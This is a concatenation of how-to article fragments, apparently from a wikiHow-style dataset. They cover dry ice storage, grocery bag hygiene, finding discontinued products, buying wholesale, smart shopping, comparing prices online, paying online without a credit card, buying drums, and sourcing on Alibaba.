Don't store dry ice in metal or glass containers, as an explosion can create shrapnel which can cause cuts or other serious injuries.

, The carbon dioxide from the dry ice will gradually begin to replace oxygen and can cause suffocation if breathed exclusively.Air out storage areas that have previously housed dry ice before entering.

, Even though no one may be around, spills and other accidents can occur if not under strict supervision.


Don't leave dry ice on tiled or solid surfaced counter tops as the extreme cold could crack it.

,


The extreme compactness of a pipe will also cause dry ice to expand quicker and may cause an explosion.

Do not store your bags in the trunk of your car because the heat will encourage the growth of salmonella. Find a temperature-controlled place in your house to store the bags., To prevent juices from the meat from sinking into the bag and contaminating it, always place meat in a separate plastic bag. Then, once the meat is safely wrapped, you can place it in the reusable bag., Keep one bag for storing meat, one for perishable fruits and vegetables, and one for non-perishables and ready-made food. This will prevent cross-contamination with more dangerous types of food., Do not use reusable bags for other purposes, like transporting gym clothes.

Check with the brand.,
Wait for special ""bring back"" campaigns.,
Consider directly petitioning the company.,
Google it.,
Visit websites such as eBay and Amazon.,
Search sites that specialize in discontinued products.,
Shop in stores.,
Scan classified advertisements.,
Use social media.,
Know what discontinued items to avoid.,
Always check for the factory seal.,
Stock up on limited edition products.",How to Buy Discontinued Products," The manufacturer of the item might keep a discontinued line for future sales or new introductions to the market.


Look for customer service information on the brand's website. For example, if your favorite pair of Nike sneakers has been discontinued, you can contact Nike to see if they provide a way for customers to purchase them directly.
Search a company's website if you cannot find the discontinued product in stores. Sometimes, brands will continue to sell things online that are not available in their stores or through their retailers.
Wait a while, then check again. Even if a product is all out of stock on a company's website, sometimes companies keep back a bit of extra stock to fill warranties or replace defected products, and then release it for sale if it is not needed. This can take a while... for instance, if a product has a one year guarantee, it will be at least a year before excess stock is released for sale.;
, Brands sometimes offer discontinued products at specific times of the year for customers who wan to stock up. For example, Bath & Body Works offers their discontinued scents bi-annually during their Semi-Annual Sale, and Bobbi Brown holds ""Bobbi Brings Back"" sales for popular cosmetics at irregular intervals.If you're not sure if your brand does bring it back campaigns, contact a customer service representative through their website (often found by clicking ""Contact Us"") or through a Facebook message or Tweet.

, If a brand discontinued your favorite product, there's a chance you're not the only frustrated customer. Social media makes it easier than ever to connect with the company's customer base and customer service representatives.


Follow the company on Twitter and Facebook. Then, tweet or post on Facebook using the company's handle or a hashtag and the company's name.
It helps if you can get support from other customers. The product was likely discontinued for a reason, and a company needs to believe that bringing it back will be lucrative. On Facebook, this means you'll need to make your post public in order for both the company and other customers to see it. Ask your friends to re-tweet or share your post or to directly send their own to the company.
For example, if you are hoping that Revlon will bring back their Outrageous brand of shampoo and conditioner, you might tweet: ""Mourning Outrageous shampoo at every shower, all these years later. Will it ever come back @Revlon?""
Be polite. Framing your request in terms of how much you love the company and want to stay loyal to it, rather than blaming the company or questioning their motives, is more likely to be successful.

, Sometimes the easiest and fastest way to locate a discontinued product for sale is the most obvious, a quick Internet search. If you are looking for a certain make, model, shade, or version of a product, include those words in your search terms.


For example, if you're looking for nail polish from the company Pure Ice in the discontinued shade First Time, Google ""pure ice first time nail polish."" If there is a seller on Amazon, eBay, or many other retail websites that has this product listed, it is likely to appear at the top of your search results.

, These sites provide private sellers with a way to sell their own stock of discontinued merchandise.


While Googling the product's name is likely to turn up results at these websites, the search engine's algorithm means that its not always reliable, so it is best for you to conduct separate searches at each website.
Compare prices and products available. Depending on the discontinued product you are looking for, there might be a large range. For example, on eBay you can find Burt's Bees discontinued products from $3 to $40. Don't just buy the first one you see; often sellers know that brand loyalists will be willing to pay more for discontinued items and jack up their prices to take advantage of your desperation. Shop around to find the best price.

, Online retailers offer discontinued products in specialty areas including beauty products, electronics and plastic goods.


Look for sites such as Discontinuedbeauty.com or Buymebeauty.com for beauty and health products,and Discontinuednomore.com for electronics, fragrances, china and other items.

, Grocery stores and large retailers such as Walmart and Target often keep areas of the store dedicated to discontinued items, which are often marked down to clearance prices.


Look for endcap displays (located on the end of each aisle), orange or red clearance sticker prices and advertisements that certain items are discontinued. Stock up on what you want.

, Ads in newspapers and online will promote products for sale that are discontinued.


Check your local newspaper as well as your city or town's Craigslist site.
You can also post your own ad on Craigslist or with your local city's Freecycle program (register at Freecycle.org).

, If you are searching for a discontinued product, take it to your Facebook friends and Twitter followers. Social networks are full of tips and ideas for finding what you need.


You can also search Facebook for groups and pages dedicated to the brand or product type, where people swap and sell their own items. Beauty brands in particular tend to have cult followings online, and can be a goldmine for discontinued items. Just remember to shop smart, and don't purchase used items unless they can be sanitized, since cosmetics and other personal items can harbor bacteria., Remember that some products are best to avoid once they have been discontinued, depending on what type of item it is and why it was discontinued in the first place.


Avoid purchasing perishable or expired food or other items with expiration dates that have passed. Doing so can be dangerous to your health.
Beauty items like nail polish might not technically expire, but they do change texture and consistency over time, so buying something that has been discontinued for more than a couple of years might not be a good idea.
Be sure you know why the item was taken off the market in the first place. Usually items are discontinued because they are not good sellers,but some items are taken off the market due to safety concerns. These items are often ""recalled"" by the manufacturer. You should be able to Google the product name and variety to find out if there is any particular reason behind its discontinuance; otherwise contact the company's customer service.

, In order to be sure the product will work well, in most cases you should avoid purchasing used items. For some items (like health and beauty products), used products can also carry the risk of spreading germs that carry disease.


If you purchase a discontinued item in store, at a garage sale, or at a flea market, be sure to check that the product is still sealed.
On websites, be sure the product description says ""sealed,"" ""factory sealed,"" or ""unopened."" If it does not specify, contact the seller before purchasing.
In some cases, you can sanitize a used beauty product. This will only work for products that are solid like solid perfume, lipstick, blush, eyeshadow, and some others, but it could also change the texture or consistency of the product, so do so at your own risk. To sanitize solid perfume or lipstick, dip a cotton pad in rubbing alcohol and wipe off the entire exposed surface. To sanitize solid eyeshadow or blush, wipe off the top layer of the exposed surface with a tissue, then spritz with rubbing alcohol from a spray bottle and let air dry., If your favorite product is manufactured as ""limited edition"" or ""limited time only,"" that means the manufacturer plans to discontinue it. Stocking up now will ensure that you have a stash until you can find a replacement.


Some brands also announce when they plan to discontinue a product line, so subscribe to favorite brand's e-mails and follow them on Facebook and Twitter to keep abreast of changes to their product lines, stocking up when necessary.

Assess potential wholesale suppliers.,
Create a wholesale account.,
Get quotes from multiple suppliers.,
Discuss price.,
Lower prices by negotiating other terms.,
Analyze other key terms.,
Hire a lawyer to review any wholesale agreement.",How to Buy Direct from a Wholesale Company," You should set up the legal form of your business, such as a corporation, limited liability company, partnership, or sole proprietorship. You may have to file forms with your state’s Secretary of State’s office (or an equivalent office).


To form an LLC, file Articles of Organization with your state and pay the necessary fee.
To form a corporation, you will need to file Articles of Incorporation and pay a fee.;
, You’ll need to pay taxes to the government, so you should get a taxpayer ID number. If you are a sole proprietor, you can use your Social Security Number. Otherwise, you should apply for a Federal Employer Identification Number (FEIN) with the IRS.


Apply for your FEIN here: https://www.irs.gov/businesses/small-businesses-self-employed/apply-for-an-employer-identification-number-ein-online.

, This permit allows you to buy goods from a wholesale supplier without having to pay a sale’s tax. Instead, you charge and collect sales tax when you sell to the public. If you buy from a wholesaler without the necessary permit, you end up paying taxes to them.Furthermore, some wholesalers won’t even sell to the public because they don’t want to bother collecting taxes.


This permit or license goes by different names, depending on the state. It might be called a resale permit, resale certificate, reseller’s certificate, sales tax ID, or sales tax permit.Contact your state’s taxing authority to ask how to get the permit. Generally, you’ll need to complete an application.
Some states might use your taxpayer ID as your sales tax ID, although others won’t.

, The easiest way to find wholesale companies is on the Internet. You should search by the product you want to buy and include your zip code to narrow the results.For example, if you want to buy T-shirts and are located in Brooklyn, you can type “t-shirt wholesale Brooklyn.”
You might also check online wholesale directories, such as Wholesale Central.You can search by location and merchandise using advanced search.

, Many wholesale suppliers attend industry trade shows. You can find upcoming trade shows by searching trade show directories such as 10times and TSNN.Search by location and industry.For example, if you are in the bridal/marriage business, then don’t search for trade shows catering to the insurance industry.
However, think broadly. As part of your bridal business, you might use extensive printing and graphics. You could attend a trade show for the graphics/printing industry if you need to buy printing supplies in bulk.

, Your industry might have a few standard trade magazines. You can find them in your library or research them online. Try to locate a physical copy of the magazine or journal and look at the ads. Wholesale advertisers often put ads in these magazines.If your library is small, it probably doesn’t carry trade magazines. However, ask the interlibrary loan department if you can get a copy from another library.

, Other business owners will know the best wholesale suppliers you can buy directly from. Ask around and write down the names and contact information for the suppliers.


Obtaining referrals this way can be tricky because competitors don’t want to let you know where they get merchandise for rock bottom prices. However, you can try to connect with other business owners at out-of-state networking events.Also ask business owners in a slightly different industry. For example, you might sell T-shirts as part of a youth apparel business. Someone else might use T-shirts as a free giveaway when consumers purchase computer services. You aren’t direct competitors, though you both use T-shirts.

, Generally, brand manufacturers only sell directly to large businesses because manufacturers sell in large volume. However, you can still call and ask who you can buy from as a small business. The manufacturer can give you the names of distributors or small wholesalers.Look for the brand manufacturer’s contact information online.
Alternately, you can look at the packaging for some of the products, which may contain a manufacturer’s contact information.

, It can be hard to find information about wholesalers. Unfortunately, there are plenty of shady middlemen who hold themselves out as wholesalers. You should analyze the following:Is the wholesaler selling to the public? Legitimate wholesalers only sell to retail establishments.
Are you charged a monthly fee? Legitimate wholesale companies don’t charge a monthly fee. However, they will charge a fee if you are running a drop-ship business.

, Once you find a wholesale company you want to do business with, you should tell them you want to create an account. They will request information from you to find out if you are a legitimate business.For example, they will want to see your reseller’s permit, tax ID, and legal documents.
You’ll also have to be approved—possibly before they will even negotiate with you about prices.

, Don’t go with the very first person you find. Instead, get quotes from at least three different wholesale companies.That way, you can be sure to get the best deal.


This isn’t always possible. If you need a certain brand, then you might be stuck going with one distributor or wholesaler.

, Price is tricky, especially if you are a small business. Wholesalers reduce the price per item when you buy a large number. However, as a small business, you might not be able to store thousands of products at one time.


If you are an established business, prove it to the wholesale company. They are more likely to do business with someone who has a track record of selling large quantities of products.When negotiating, tell the company you are getting other quotes. This knowledge might create an incentive for them to lower their prices.
You can negotiate by offering to pay a higher deposit. If you pay 50-70%, you might have more leverage in the negotiation.
Be suspicious of extremely low prices, which might be a sign the goods are low-quality. For this reason, you should ask for samples before settling on a contract.

, If the wholesale supplier won’t budge on price, you should try to negotiate other favorable terms which can collectively lower your price. For example, try to get a better deal on the following:Faster shipping for free. You can improve your client satisfaction by getting the products faster.
A more comprehensive or longer warranty.
Larger discounts when buying in bulk.

, Pay attention to the following terms in the wholesale contract. You need a contract that works for your business, and you should be prepared to negotiate changes to the following if necessary:Delivery schedule. Will the wholesaler send the goods when you need them? For example, if you can only accept goods in the morning, check that the wholesaler doesn’t only deliver after noon.
Minimum orders. Some wholesalers might require a minimum purchase, e.g., 5,000 items. Check that the minimum is reasonable for your business, otherwise go with someone else.
Return policy. The products might be defective or not what you were expecting. Make sure the contract allows you to return goods for a refund.

, Find a business attorney and schedule a consultation. Show the lawyer the contract and ask if anything is missing or how else you can protect yourself.


You can find a business lawyer by getting referrals from other business owners. You may also contact your local Chamber of Commerce and ask if they can refer you to anyone.
Alternately, you can contact your nearest bar association and get a referral. Find your nearest bar association by entering your address at this website: http://shop.americanbar.org/ebus/abagroups/divisionforbarservices/barassociationdirectories/statelocalbarassociations.aspx.

Research handicraft items you would like to buy.,
Determine if you have space for the handicrafts you would like to buy.,
Create an affordable budget.,
Shop around.,
Contact the seller.",How to Buy Handicrafts,"  Do they need to be practical and/or aesthetic? Determine what makes an item visually appealing to you. Is it the texture, colour(s), material(s) the item is made out of, size, shape or culture represented?;
,  Are the handicrafts delicate and need to be kept out of harm's way?  Will they need to be put on shelves? Are the handicrafts practical but large and also need to be kept out of the way of main living areas?

, Due to the expertise of the artisan and materials used, keep in mind that some handicrafts can be quite pricey!  On the other hand some artisans with expertise may be able to offer exceptionally affordable prices because the materials don't cost as much or they want to sell inventory to make room for new items.  Be careful that you don't purchase what you would consider too many items! Remember that you will need room for these items and some of these may have extra costs associated with them  because they require special care and/or treatments.

, Many online e-commerce websites such as eBay, Etsy, and Amazon cater to a very large number of people who want to purchase artisan crafts. They are very popular! Will you be shopping locally, online or will you travel to purchase your handicrafts? Find the best price you can for similar items so you can recognize if you are purchasing items at a reasonable price.

, Although typically online purchases don't require any contact with the seller, in certain cases you may need to.


Ask if the item(s) require special care and special instructions to keep the handicrafts clean.
If you are purchasing a handicraft for use as a gift, inform the seller and inquire if the seller accepts refunds in case the recipient absolutely doesn't like.
If you have any allergies, ensure that the product was not made with your allergens.

Do not shop in a hurry.,
Read everything in the ad.,
Read every word on the signs above the merchandise.,
Most stores have a couple of items that are set prices.,
Bring a calculator and way to record prices the of clothes you pick up.",How to Become a Smart and Polite Retail Shopper," If you do not have time to try on a piece of clothing; you do not have time to buy it. Find another time to shop. It will only take a minute or two to try on a piece of clothing. Weigh that against the time it would take to drive back to the store and return the item. (Also, do not forget the cost in gas money.)  Even a piece of clothing that is your size may not be sewn correctly. Also, do not forget the frustrating array of size discrepancy from one clothing brand to the next.;
, Read all exclusions on the back and front of coupons and ads. Also read the dates that the sales are covered on the ads. If the sale date is not on the front of the ad it is usually on the bottom of the back page of the ad. The print is tiny, even for young people. Get a magnifying glass. Even a cheap plastic one will do. The companies are counting on your emotional reaction to the coupon to get you in the door. Make sure the 25% off coupon is really good on the item you want before driving to the store.

, Not all items on a rack may be the sale price. For example: The sale might be for tops only and there also might be bottoms on the same fixture. The price will be for the tops only.

, Some signs will say: no additional discounts apply, lowest price or never sold for less. Keep in mind you can't use coupons on these items.

,  Take on the responsibility to know how much you are going to spend. This will keep you from overspending. It is also very polite. It makes the wait of the people behind you much longer if you make all decisions about buying by price at the checkout counter.

, Instead of purchasing something could you make it, get it used, fix something you already own, or do without? Could you use a less expensive alternative or a generic or house brand item?

, Write things down while you're at home, where you'll most likely be using most of your purchases.

, You don't have to study every loaf of bread, but if you're thinking of buying an appliance, an automobile, a computer, etc., it can be well worth your time to familiarize yourself

, If it's more than two items, write them down.


Writing things down while you're at home helps you not to forget them when you're at the store, thus saving you trips, time and money. This is especially true for day-to-day purchases.
Lists of larger purchases or potential can help you to distinguish between needs and wants, and to consider larger purchases more carefully before buying them.
A list can be a good place to leave things you're still considering. You may learn more about a particular item or decide you don't need it later on.

,


For items that you buy routinely, such as groceries, watch the advertisements and know what good prices are and what very low sale prices are. You can keep a notebook with prices at different stores if it helps.
For items you purchase less frequently, do a price comparison. Call or shop around to a few different stores. Look online, too, but don't forget to figure in the extra costs of shipping and taxes.

, Stores go out of their way to put the basic items in the back so that you have to wander past prominently placed, colorful bargains. If you didn't need junk food, colorful sandals, or an extra 100-foot extension cord when you were at home, you don't need it in the store.

, Bulk pricing can get you a good deal, but if you end up with 25 pounds of flour and you never bake, it's not really a good deal. Buy in bulk if you use it, if it will last long enough for you to use it, if you have the space to store it, and if the price is really better than you'd get buying a more moderate quantity.

, Is it really a good deal, or is somebody trying to upsell you or persuade you to buy something you don't need?

,, Seeing yourself part company with your money, and parting company only with money you have, can often remind you to spend less. It can certainly help you keep from overextending yourself.

, Will this purchase become clutter? Will you be able to go on using it for a long time? Can you do without it for now?

, A restaurant meal, a gym membership, and a monthly cell phone bill are all purchases you should evaluate carefully. Scrutinize anything with a monthly bill or monthly payment with special care, since a few dollars a month can quickly turn into many dollars per year.

, Include taxes, subscriptions, shipping, upkeep, and your own time to use or set up whatever you are purchasing.

, Not all prices are negotiable, but it doesn't cost you anything to ask. Simply asking ""Is this the best price you can offer?"" can often bring the price down, but depending on the situation, you may want to haggle a bit.

Scope out cool consignment and thrift shops.,
The key is to think before you buy.,
Get some makeup.,
First, write down the make up you use most often.,
Go into the drugstore and buy ONLY the things on your list.",How to Be a Smart Shopper (Teen Girls)," Even if you've never shopped at a thrift store in your life, now may be the time to start. No, they don't sell old musty sweaters and things even your grandmother wouldn't wear. There are actually a few amazing ones--including some super trendy and cool vintage thrift shops downtown in cities. A good idea would be to Google ""thrift stores"" along with the name of the city closest to you, and you'll get tons of listings for great stores.


Even when thrift shopping, you'll still have to be, well, thrifty. Prices can add up quickly if it's a great store, so before you buy that sparkly pink dress for just $29.99, think about this:
It may look great hanging on the rack, but will you really like how it looks on you?
Will you ever really wear it? Try to think of at least three reasonable occasions when you'd wear it. School and church probably aren't one of them. Sure, it might be a great dress for that end-of-the-year dance, but if it's 8 months away, buy a dress then, not now. Chances are that dress won't look so amazing after 8 months of collecting dust in your closet.
Can you live without it? In other words, is it really worth that 30 dollars you COULD use to get a new pair of shoes or a shirt you'll get tons of use out of?;
, Never rush straight to the counter with the first things you saw in the store. Always try on clothes before you buy them, and never buy something just because it's a ""cool"" brand name.

, Girls love make up--after all, what's not to love? You can mix and match new brands and discover new products you'll love, and they make you look great. But the bad news is that make up can get expensive. Very expensive. Remember, you're not Emma Watson with a yearly income of $10 mil, so you can't afford to waltz through Nordstrom department store and buy whatever you want. Believe it or not, drug stores are a great place to get make up that's both a good quality AND a good price. As unglamorous as it sounds, drug stores are perfect if you still want to look amazing wearing the make up you love at a price you'll love even more.

, Like the make up you wear to school, when you hang out with your friends, etc. If you're a make up fanatic, like most girls, and you can't go into a make up store without buying everything in sight, this list will be a big help.

, There will most likely be lots of different kinds of a certain type of make up, like eyeliner. There will be pencil eyeliner in all different shades, and liquid eyeliner in all different shades. If you want to stick to your budget, you'll have to pick just one. Narrow your choice down to the type of make up you want with the best price. See an amazing black liquid eyeliner for just $3? Buy it! See an extra amazing green liquid eyeliner for $7? Leave it.

Account for special deals or gifts, not just price.,

If this is the first time you're trying a new color or brand, again, you might wish to at least get a sample before purchasing a whole lot from an online source. You won't be too happy if you discover it fails to match your complexion or just isn't ""you"".;
, A simple search for the manufacturer's name will often bring up their website to the top of the returns. Use the manufacturer's website to give you all of the information you're seeking about the products, the ingredients, the end uses, and so forth. Once you're happy you know enough, you can begin to search for suitable places to purchase it from.


Find out if the company can send you samples if you're trying something for the first time.

, In some cases, the manufacturer's site might provide recommended retailers; this can be helpful but don't feel that it's your only choice, as they may also be the most expensive sources.


If the brand of cosmetics you're after is not sold through a retailer, check the manufacturer's site. It may be that they only allow sales directly from their own site, especially if they're a boutique manufacturer. It should be clear when visiting the site that they only allow direct sales.

, It's possible that one or more of your friends is already purchasing makeup online and they can be a useful source of trusted suggestions. Find out what prices they're paying and what they think of the service before making your decision.

, Also consider checking out various other possible sources:


Bargain resellers that include cosmetic lines
Auction traders, such as eBay
Specialist designer or trading stores that carry cosmetics lines; some require membership, either for free or for a nominal fee.


Try to find at least three different stores selling the same product, to give you the opportunity to compare the product pricing.







, If there are multiple retailers that sell the cosmetics item you want to buy, then the next part will be deciding which one to shop with. The benefit of shopping online is that you can check the prices of an item at many different locations without having to check at each store individually.

, In some cases, there may be price comparison sites available to use, in other cases you may need to select the most well-known discounters and compare them all individually for the cosmetics line. Open a new tab in your browser for each retailer, to make it easy for you to compare prices between them.


It might help to keep a list either on your computer or on paper, so that you can compare the prices across the columns.

, Be aware that price isn't always the deciding factor for the best deal; sometimes there is other incentives that you may want to take into consideration. These include gift with purchase events, reward programs, savings events, and online coupons. Always account for these possibilities before deciding on what you consider to be the best price.


Gift with purchase events are popular at department stores. During these events you can get free beauty products with a purchase from that particular brand. These gifts often include several sample/travel sized items and a cosmetic bag. They are often valued at more than $100. These are offered for limited times throughout the year at most department stores. The key to these saving events is timing, so sign up for beauty department emails from your favorite stores to keep updated.
Reward programs are popular at many stores and often offer you savings by giving you points based on how many dollars you spend with them. The points can then be redeemed for things such as coupons or free merchandise. This can factor into your retailer selection since the accumulation of points could save you money.
Savings events occur at varying times throughout the year and are often advertised in their sales advertisements or on the website itself. These events can vary in the types of promotions that are used. It could be a percentage off your purchase automatically or a BOGO (buy one get one) event.
Online coupons can save you money on your total purchase. Often coupons for retailers online are a percentage or set amount off your order. These coupon codes are usually entered in at checkout where your discount will be applied. Make sure that the coupon has a valid date and that all conditions are met (such as minimum amount spent).

, If you have to pay more in shipping than the final price at the store, it's no longer good value. Be sure that whatever you buy is still good value when the shipping has been taken into account.

, This will give you the opportunity to take advantage of every sales event at your favorite online retailers and stores."

Place your order with the seller itself.",How to Compare Prices Online1," Price comparison tools are websites or apps that allow you to select a product and see the prices that product is offered at by various online vendors. Most of these tools are from third party companies that are not affiliated with any one store or seller.Some major vendors also have their own price comparison tools, however.When doing an Internet search for a third party comparison tool, go to your favorite search engine and type in ""compare prices online."" You could also type something along the lines of ""price comparison tool.""






When searching for a specific store's or company's price comparison tool, try doing a search for ""price comparison tool"" or ""compare prices online"" followed by the name of the store. If the store has its own tool, the result should pop up fairly high in the list.






If you do a lot of Internet surfing on a smart phone, consider doing an Internet search for ""price comparison apps"" instead.;
, While each price comparison tool is a little different, many can be searched in the same manner. The product keyword you search by can be for a generic item, like ""mixer,"" or it can be the name of a specific company's product, like ""Kitchenaid mixer."" Some comparison tools will even make suggestions as you type.

, If you are unable to think of a specific search term, you can also browse through the departments on the site until you find what you are interested in.

, Regardless of whether you did a keyword search or browsed through the departments, a lengthy list of possible items will pop up. Look through the list until you find the product you are interested in buying.

, With most price comparison tools, a link to the seller's product page or to the seller's website will be available. You will need to buy the product from the seller itself rather than through the price comparison tool.

Buy with your debit card.,
Use an online payment company.,
Purchase with a check.,
Use your checking account for an electronic fund transfer.,
Pay with an electronic wallet.",How to Buy Something Online Without a Credit Card1," Most sites that accept credit cards will also accept debit cards. Debit cards are easy to get because they come with any bank account. It allows you to use your checkbook for easy record-keeping of what you buy. It is also faster than other options. Since credit cards can lead to debt, using a debit card can save you from that problem because it takes the money directly out of your bank account.


To buy with a debit card, you enter the card number on the payment page just like you would a credit card. Sometimes, however, you might have to put in your PIN number.It can be risky because it gives direct access to your checking account. It could possibly be used for fraud.;
, There are some online companies that act as a payment service for you. With these services, such as PayPal or Amazon Payments, you don't have to give your information directly to the website that you are buying from. You connect a debit card or checking account to your virtual account on the online platform on their site. You can then buy whatever you want and the payment company will take care of it.


You use these sites by creating an account. Chose the sign up option from their site. You will need to create a profile. You typically need to pick a username and password and add your email address. You will have to create answers for challenge questions that are used for your security. You then provide them with your address and additional personal information. Then you put in the information of the checking account you want linked to the account.
Many online retailers accept these forms of payment, but not all do. Make sure you check whatever store you are buying from., You can still buy from certain online store with checks, but it might be very difficult to use this option. Stores on websites such as EBay and Etsy will likely be more willing to accept this option than a larger retailer. For these methods, you send the check and wait for it to clear the bank. Then, your items will be shipped. The problem with this method is that it takes a lot more time than other methods. The store has to wait for the payment to arrive. This means you have to wait for the items you bought as well.


You can also use a money order. These work just like a check. You send them, the store cashes them, and then your items are shipped. You can buy these at many stores and your local post office. , Large online retailers such as Amazon accept electronic fund transfers (EFTs). This method works by transferring money from your personal checking account to the store. To set this up, you usually have to add your checking account to your profile. This means you need your account number and bank routing number. You then have to enter the name and the address of the person who is named on the account. You may also be asked to give the drivers license number of the account holder and the state that issued the ID.


Most sites will not accept business, corporate, or savings accounts.Just like with a debit card, there is some risk involved because you are giving out your bank account information to a third party. Make sure it is a reputable website or store before you give away your information.

, Many companies and businesses have created electronic wallets. Google Wallet is the most popular, but companies such as Starbucks and Apple have also launched them. The electronic wallet is different than the traditional online payment service. They are on your device as an app instead of working through an online site. Digital wallets allow you to add money to them in a variety of ways. You can add with a debit card or checking account. To use, all you have to do is create an account and add money. Then just select the payment type, swipe the screen of your phone, and you have bought the items.


You can also use other units of value like loyalty points or mileage anywhere that will accept them. With a digital wallet, you don't have to go through a hectic redeeming process. The app does it all for you.
This is an important new development because mobile apps are one of the largest areas of growth in tech, media and other industries. This now includes payment systems."

Make a list of stores.,
Visit each store’s website.,
Locate the desired product on each website.,
Check shipping policies.,
Mark down your findings as you go along.,
Add each product page to your favorites.,
Compare your findings.,
Buy the item.",How to Compare Prices Online2," Think of the stores you shop with the most and the stores you consider most reliable or inexpensive. The list of stores you come up with will likely vary depending on the type of product you are looking for. You may, for instance, check with various department stores when shopping for clothing, a mix of department and home goods stores when looking for small kitchen appliances, or a mix of department and home improvement stores if looking for large appliances or tools.

, If you do not know the store website address already, go to a search engine and type the store’s name in. The store’s website is usually the first hit to pop up. If you have difficulty, though, you could also try searching the store’s name with “official website” typed after it.

, You can either locate the product by doing a search, using the store’s search bar, or by browsing through the departments until you find what you are looking for. If you are looking for a specific product, doing a keyword search is the most efficient and practical means. If looking for a generic product, browsing through the departments might prove more useful.

, While a product may be cheaper at one store than it is at another, the difference in shipping costs can sometimes make the more expensive item cheaper to buy. Stores that offer free “in store pickup” are, understandably, the cheapest.

, As soon as you find the product you want on each store’s website, jot down the name of the product as well as the price. If the product is currently on sale, make a note of that fact along with when the sale ends, since the price will likely go up after the sale finishes.

, Saving the product page from each store to your favorites list will make it easier to go back to the product you decide to buy later.

, After you visit all the websites on your list, compare which ones had the best prices. Since all of these stores are, theoretically, ones you feel comfortable shopping at, the only things you really need to take into account are the cost of the product and the cost of shipping.

, Return to the product page of the store that had the best price and make your purchase. Alternatively, if the product is marked “Available in stores,” you can also drive to that store and purchase the product there.

Use collect on delivery.,
Redeem points or rewards.,
Purchase items with gift cards.",How to Buy Something Online Without a Credit Card2," Collect on delivery (COD), also known as cash on delivery, allows you to buy something and then pay for it when it arrives. The primary benefit of this option is that no money is spent until you get the items. You can check the product delivered and refuse delivery if necessary. This leaves the responsibility of the item to the seller instead of you. One other benefit is that, depending on the company, you can buy things for much higher than most credit card limits. Cash used to be accepted, but it is rarely accepted now. To pay when your items arrives, you need to pay with a personal check, business check, cashier’s check, or money order.


This used to be very common but is not as popular anymore. It is still possible with individual sellers and small retailers.
UPS, Fedex, and the USPS still offer this service. It is available within the United States and between the US and Canada. Fedex also does COD in India.
COD can have more costs than normal shipping. The extra costs have to be paid by you when the items arrive.
This option is great for high-dollar purchases that exceed your credit card limit. , Some online retailers, such as Amazon, Macy's, and EBay, will allow you to use points for purchases. You can enable this option from these sites from their pay with points pages. You can use points from cards such as the Amazon.com Business Rewards Visa, the American Express Membership Rewards, the Chase Ultimate Rewards, the Discover Cashback Bonus, the Discover Miles, and the Citi Thank You card. The drawback to this method is that the value of points is often very hard to figure out. They will vary from company to company and even from product to product.


There is usually a dollar value associated with getting points, such as one point per dollar spent. The value when you spend the points is typically not the same. Each program is different and you should consult the terms and conditions of your program to determine the value of points or rewards.
Points can be collected and redeemed in many different ways. You can also get rewards from e-commerce sites such as Amazon or the Ebay Bucks program., Gift cards can be used at many online store such as Amazon, Barnes and Noble, and Hallmark. You can use a gift card to buy any item from the online store, just like you would cash in a real store. You can also add the card balance to your account to be used the next time you buy something. The processes of using gift cards is similar across sites. If you want to use it on a particular purchase, you can enter it on your payment page when you are checking out. There is typically an option to redeem a gift card on your payment screen. You then locate the claim code on the card and enter it into the site.


To add the money to your account, go to your account page on the site. Choose to add a gift card to your account from this page. Enter the claim code and then hit submit or apply.
For plastic gift cards, you may need to scratch off the coating on the back of the card to see the code. The claim code is different than 16-digit card number.
Purchase gift debit cards. Gift debit cards (ie. Visa Gift Card, AMEX Gift Card,etc.) are accepted anywhere debit cards are accepted. You will likely be able to purchase them at a store that sells gift cards. They work like gift cards, however they are accepted anywhere debit cards are accepted, and some can be re-loaded.

Determine your budget.,
Test drum sets first-hand if possible.,
Browse drum sets on online retailers' websites.,
Check the return policy for each retailer.,
Purchase any cymbals or accessories needed.",How to Buy a Drum Kit Online," To determine how much you want to spend on a drum set, assess its desired application. A drum set used by an introductory student can be had on the lower end of the price spectrum. A set used for a recording session, however, might warrant a larger budget, as the quality and tone of the drums will be under greater scrutiny.;
, While buying online is a very good option, the downside is that you must purchase drums without having played them first. To remedy this, visit a local music shop to demo several of their drum sets in person. Most shops will allow you to play the drums right in the store; if you are new to drumming or buying the set for someone else, you can ask an employee to demo the set for you.


Physical stores will have a limited selection of drums compared to online retailers. Even if you cannot demo a specific kit in person, you can get an idea of the kit's quality by playing other kits by the same manufacturer.

, There are many online retailers that specialize in musical instruments; some of the major ones are Musician's Friend, Sam Ash, and Casio Interstate Music.


Make sure to compare each drum set in which you're interested across multiple retailers. Check for differences in price and shipping charges.
Read customer reviews for each drum set to assess whether the set will meet your needs.

, After deciding on a drum kit to purchase, read about the store's return policy carefully. Because of their weight and size, drums are very expensive to ship. Look for stores that offer free shipping for returns or exchanges, in case you aren't happy with your purchase or receive a defective kit. Retailers with physical stores will often allow you to make exchanges at the store even after buying online.

, If you are buying your first drum set, you will need cymbals and a few accessories. At the minimum, you need a ride cymbal, hi-hat cymbals, cymbal stands for both, a snare drum stand, and a bass drum pedal. Purchasing these along with your drum set may save you money on shipping.

If you don’t have an account, go to the signup page and follow the onscreen instructions to create one.You don’t need a wholesaler’s license to create an account. However, if you’re selling any items sourced from Alibaba, you’ll be subject to your local jurisdiction’s business and tax regulations.
In the United States, you can get help obtaining a business license and tax ID on the U.S. Small Business Administration website.For locations outside the U.S., look on your nation’s government website and search “set up a business” to find out about required licensing.;
, There are multiple methods of searching for products on Alibaba. The most basic way is by entering keywords or phrases into the products search bar on the the main page. Select the “Products” tab, enter your search term in the search bar, select your country using the drop-down menu, and click the “Search” button.You can also search products using the categories along the left-hand side of the homepage. Hover over a category then click a subcategory to browse products.

, Searching by product and category can return thousands of items, so it could take lots of time to sort through products. You can use the options on the left side of the search results page to narrow your search and return fewer, more specific results.For example, a search for ""jeans"" will return over 500,000 hits, but you can check boxes on the left to make your search more specific. Checking boxes like ""men's jeans"" or ""denim"" and adding keywords like a particular color will return far less hits, making it easier to sort through your search results.
You can also filter your product search results by the suppliers' country of origin. This will help you track down suppliers in your country, which will help cut shipping costs and time., Instead of searching by product, you can select the “Suppliers” tab next to the search bar. This will return suppliers who specialize in the product you’re trying to purchase.If you've worked with a supplier before or know of a supplier who specializes in your desired product, you can use this search tool to find them more easily than with a product search.

In the message body, you can any other relevant product specifications.
Below the message body, you can add details about your shipping destination and preferred payment method.  

, Once you’ve found suppliers through the search engine tools or by RFQ, go to their profile pages to verify their legitimacy.Look for profile badges to make sure you’re dealing with a verified supplier:The A&V Check indicates that the supplier has passed authentication and verification inspection by Alibaba and a third-party verification service.
